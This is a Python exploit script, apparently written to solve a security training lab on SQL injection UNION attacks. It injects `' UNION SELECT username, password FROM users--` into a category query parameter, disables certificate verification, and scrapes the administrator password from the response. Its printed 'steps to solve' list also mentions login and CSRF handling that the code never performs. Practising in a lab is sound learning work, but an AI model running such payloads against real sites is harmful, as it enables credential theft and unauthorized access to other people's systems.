import requests
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection UNION attack, retrieving data from other tables"

def exploit_sqli_users_table(url, proxies=None):
    path = "/filter?category=Gifts"
    payload = "' UNION SELECT username, password FROM users--"
    full_url = url.rstrip("/") + path + payload

    try:
        r = requests.get(full_url, verify=False, proxies=proxies)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

    if "administrator" in r.text:
        print("[+] Found 'administrator' in the response.")
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            admin_password = soup.body.find(text="administrator").parent.findNext('td').text.strip()
            print(f"[+] Administrator password: {admin_password}")
            return True
        except Exception as e:
            print(f"[!] Error parsing HTML: {e}")
            return False
    else:
        print("[-] Administrator not found in the response.")
        return False


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to retrieve administrator password from users table\n2. Fetch the login page\n3. Extract the csrf token and session cookie\n4. Login as the administrator\n5. Fetch the administrator profile\n""")

    print("[+] Attempting SQLi to dump user credentials...")
    if exploit_sqli_users_table(url, proxies=proxies):
        print("[+] Login with the above creds!")
        return True
    else:
        print("[-] Lab exploit failed.")
        return False
